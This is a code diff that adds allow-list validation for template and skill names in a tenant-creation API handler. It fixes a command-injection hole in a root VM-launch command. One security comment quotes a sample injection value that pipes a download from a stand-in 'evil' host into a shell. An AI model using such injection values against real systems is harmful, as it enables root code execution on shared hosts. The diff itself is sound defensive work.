@@ -683,6 +683,14 @@ def create_tenant(body=None):
         return _resp(400, {"error": quota_err})
 
     config_template = body.get("config_template", "")
+    # SECURITY: config_template is interpolated verbatim into the root SSM
+    # command that launches the VM (_launch_vm → launch-vm.sh arg 5). It MUST
+    # be a bare template name, never shell metacharacters — otherwise a request
+    # like config_template="x; curl evil|sh #" is arbitrary root RCE on a
+    # shared host. Same allow-list as skill names (both are S3 subdir names).
+    if config_template and not _SKILL_NAME_RE.match(config_template):
+        return _resp(400, {"error": "config_template must match "
+                                    "^[a-z0-9]([a-z0-9-]{0,62}[a-z0-9])?$"})
     restore_from = body.get("restore_from")
     clone_from = body.get("clone_from")
 
@@ -693,6 +701,13 @@ def create_tenant(body=None):
         if not isinstance(skills_in, list) or not all(isinstance(s, str) for s in skills_in):
             return _resp(400, {"error": "skills must be a list of strings"})
         skills_in = sorted(set(s.strip() for s in skills_in if s and s.strip()))
+        # SECURITY: each skill name is joined into the same root SSM command
+        # (launch-vm.sh arg 7, comma-separated). Reject metacharacters — same
+        # command-injection vector as config_template above.
+        bad = [s for s in skills_in if not _SKILL_NAME_RE.match(s)]
+        if bad:
+            return _resp(400, {"error": f"invalid skill name(s): {bad} — must match "
+                                        "^[a-z0-9]([a-z0-9-]{0,62}[a-z0-9])?$"})
     group_in = (body.get("group") or "").strip()
     if group_in and not _NAME_RE.match(group_in):
         return _resp(400, {"error": "group must match ^[a-z0-9]([a-z0-9-]{0,30}[a-z0-9])?$"})
